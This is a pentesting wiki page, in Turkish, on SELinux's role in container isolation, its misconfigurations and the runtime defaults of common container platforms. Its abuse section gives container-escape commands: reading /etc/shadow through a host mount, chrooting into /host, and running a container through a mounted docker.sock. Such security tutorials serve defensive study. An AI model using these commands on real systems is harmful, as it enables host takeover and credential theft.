# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

SELinux, **etiket tabanlı Zorunlu Erişim Kontrolü** sistemidir. İlgili her süreç ve nesne bir güvenlik bağlamı (security context) taşıyabilir ve politika hangi domainlerin hangi türlerle ve hangi şekilde etkileşebileceğine karar verir. Konteynerleştirilmiş ortamlarda bu genellikle runtime'ın konteyner sürecini kısıtlı bir container domain altında başlattığı ve konteyner içeriğini uygun türlerle etiketlediği anlamına gelir. Politika doğru çalışıyorsa, süreç etiketiyle erişmesi beklenen şeyleri okuyup yazabilirken, diğer host içeriğine erişimi reddedilir; bu içerik bir mount aracılığıyla görünür olsa bile.

Bu, ana akım Linux container dağıtımlarında mevcut olan en güçlü host-yönlü korumalardan biridir. Fedora, RHEL, CentOS Stream, OpenShift ve diğer SELinux-merkezli ekosistemlerde özellikle önemlidir. Bu ortamlarda SELinux'u görmezden gelen bir inceleyici, açık görünümlü bir host ele geçirme yolunun aslında neden engellendiğini sıklıkla yanlış anlayacaktır.

## AppArmor Vs SELinux

En kolay yüksek seviyeli fark, AppArmor'ın yol tabanlı iken SELinux'un **etiket tabanlı** olmasıdır. Bu, konteyner güvenliği için büyük sonuçlar doğurur. Yol tabanlı bir politika, aynı host içeriği beklenmedik bir mount yolunun altında görünürse farklı davranabilir. Etiket tabanlı bir politika ise nesnenin etiketinin ne olduğunu ve süreç domaininin ona karşı ne yapabileceğini sorgular. Bu SELinux'u basit yapmaz, ancak AppArmor tabanlı sistemlerde savunucuların bazen kazara yaptığı bir sınıf yol-hile varsayımlarına karşı sağlam olmasını sağlar.

Model etiket odaklı olduğu için, container volume yönetimi ve yeniden etiketleme kararları güvenlik açısından kritik öneme sahiptir. Eğer runtime veya operatör, "mountların çalışmasını sağlamak" için etiketleri aşırı geniş bir şekilde değiştirirse, iş yükünü kapsaması gereken politika sınırı amaçlanandan çok daha zayıf hale gelebilir.

## Laboratuvar

Hostta SELinux'un etkin olup olmadığını görmek için:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Host üzerindeki mevcut etiketleri incelemek için:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Etiketlemenin devre dışı bırakıldığı bir çalıştırma ile normal bir çalıştırmayı karşılaştırmak için:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinux etkin bir hostta, bu çok pratik bir gösterimdir çünkü beklenen konteyner domaini altında çalışan bir iş yükü ile bu zorlama katmanından arındırılmış bir sürüm arasındaki farkı gösterir.

## Runtime Kullanımı

Podman, SELinux'un platform varsayılanının bir parçası olduğu sistemlerde özellikle iyi uyum sağlar. Rootless Podman ile SELinux, süreç zaten host tarafında ayrıcalıksız olduğu ve hâlâ MAC policy tarafından sınırlandırıldığı için en güçlü yaygın konteyner temellerinden biridir. Docker da desteklenen ortamlarda SELinux kullanabilir, ancak yöneticiler bazen volume-labeling sürtüşmesini aşmak için onu devre dışı bırakırlar. CRI-O ve OpenShift, konteyner izolasyon hikâyelerinde SELinux'a büyük ölçüde güvenir. Kubernetes de SELinux ile ilgili ayarları açığa çıkarabilir, fakat bunların değeri açıkça node işletim sisteminin gerçekten SELinux'u destekleyip uyguladığına bağlıdır.

Tekrarlayan ders şudur: SELinux isteğe bağlı bir süsleme değildir. Onun etrafında kurulan ekosistemlerde beklenen güvenlik sınırının bir parçasıdır.

## Yanlış Yapılandırmalar

Klasik hata `label=disable`'dır. Operasyonel olarak bu genellikle bir volume mount reddedildiğinde olur ve en hızlı kısa vadeli çözüm, etiketleme modelini düzeltmek yerine SELinux'u denklemin dışına atmaktır. Bir diğer yaygın hata ise host içeriğinin yanlış yeniden etiketlenmesidir. Geniş çaplı yeniden etiketleme işlemleri uygulamayı çalışır hale getirebilir, ancak konteynerin erişebileceği alanı aslında amaçlanandan çok daha genişletebilir.

Ayrıca **yüklü** SELinux ile **etkili** SELinux'u karıştırmamak önemlidir. Bir host SELinux'u destekleyebilir ama hâlâ permissive modda olabilir veya runtime iş yükünü beklenen domain altında başlatmıyor olabilir. Bu durumlarda koruma, belgelerin öne sürdüğünden çok daha zayıftır.

## Kötüye Kullanım

SELinux yoksa, permissive ise veya iş yükü için geniş çapta devre dışı bırakıldıysa, host'a monte edilmiş yollar kötüye kullanıma çok daha açık hale gelir. Aksi takdirde etiketlerle kısıtlanacak aynı bind mount, doğrudan host verilerine veya host üzerinde değişiklik yapmaya açılan bir yol haline gelebilir. Bu durum, yazılabilir volume mountlar, container runtime dizinleri veya hassas host yollarını kolaylık sağlamak için açığa çıkaran operasyonel kestirmelerle birleştiğinde özellikle önemlidir.

SELinux sıklıkla, runtime bayrakları benzer görünmesine rağmen neden genel bir breakout writeup'un bir hostta hemen çalışıp diğerinde defalarca başarısız olduğunu açıklar. Eksik bileşen çoğu zaman bir namespace veya capability değil, sağlam kalan bir label sınırıdır.

En hızlı pratik kontrol, aktif konteksleri karşılaştırıp ardından normalde label ile sınırlandırılmış olması gereken monte edilmiş host yollarını veya runtime dizinlerini yoklamaktır:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Eğer bir host bind mount mevcutsa ve SELinux etiketleme devre dışı bırakılmış veya zayıflatılmışsa, bilgi sızdırma genellikle önce gelir:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Eğer mount writable ise ve container kernel açısından fiilen host-root ise, bir sonraki adım tahmin etmek yerine kontrollü host değişikliğini test etmektir:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux özellikli hostlarda, çalışma zamanı durum dizinleri etrafındaki etiketlerin kaybolması doğrudan ayrıcalık yükseltme yollarını da açığa çıkarabilir:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Bu komutlar tam bir escape chain'in yerini tutmaz, ancak SELinux'un host veri erişimini veya host tarafı dosya değişikliğini engelleyip engellemediğini çok hızlı bir şekilde ortaya koyar.

### Tam Örnek: SELinux Devre Dışı + Yazılabilir Host Mount

Eğer SELinux etiketleme devre dışıysa ve host filesystem `/host` yazılabilir olarak mount edilmişse, tam bir host escape normal bir bind-mount abuse case'e dönüşür:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Eğer `chroot` başarılı olursa, container süreci artık host filesystem üzerinde çalışıyor:
```bash
id
hostname
cat /etc/passwd | tail
```
### Tam Örnek: SELinux Devre Dışı + Runtime Dizin

Eğer workload, labels devre dışı bırakıldıktan sonra bir runtime socket'e ulaşabiliyorsa, escape runtime'a devredilebilir:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
İlgili gözlem, SELinux'un sıklıkla tam olarak bu tür host-path veya runtime-state erişimini engelleyen kontrol olduğudur.

## Checks

SELinux kontrollerinin amacı, SELinux'un etkin olup olmadığını doğrulamak, mevcut güvenlik bağlamını (security context) belirlemek ve ilgilendiğiniz dosya veya yolların gerçekten etiketle sınırlandırılmış (label-confined) olup olmadığını görmektir.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
What is interesting here:

- `getenforce` ideal olarak `Enforcing` döndürmelidir; `Permissive` veya `Disabled` tüm SELinux bölümünün anlamını değiştirir.
- Mevcut işlem bağlamı beklenmedik veya çok geniş görünüyorsa, iş yükü muhtemelen amaçlanan container politikası altında çalışmıyor olabilir.
- Host'a mount edilmiş dosyalar veya runtime dizinleri, süreç tarafından çok serbestçe erişilebilecek etiketlere sahipse, bind mounts çok daha tehlikeli hale gelir.

SELinux özellikli bir platformda bir container'ı incelerken, etiketlemeyi ikincil bir detay olarak ele almayın. Birçok durumda bu, host'un hâlihazırda ele geçirilmemiş olmasının ana sebeplerinden biridir.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, broad relabeling of bind mounts, `--privileged` |
| Podman | Commonly enabled on SELinux hosts | SELinux separation is a normal part of Podman on SELinux systems unless disabled | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Not generally assigned automatically at Pod level | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | weak or broad `seLinuxOptions`, running on permissive/disabled nodes, platform policies that disable labeling |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | SELinux is often a core part of the node isolation model in these environments | custom policies that over-broaden access, disabling labeling for compatibility |

SELinux defaults are more distribution-dependent than seccomp defaults. On Fedora/RHEL/OpenShift-style systems, SELinux is often central to the isolation model. On non-SELinux systems, it is simply absent.
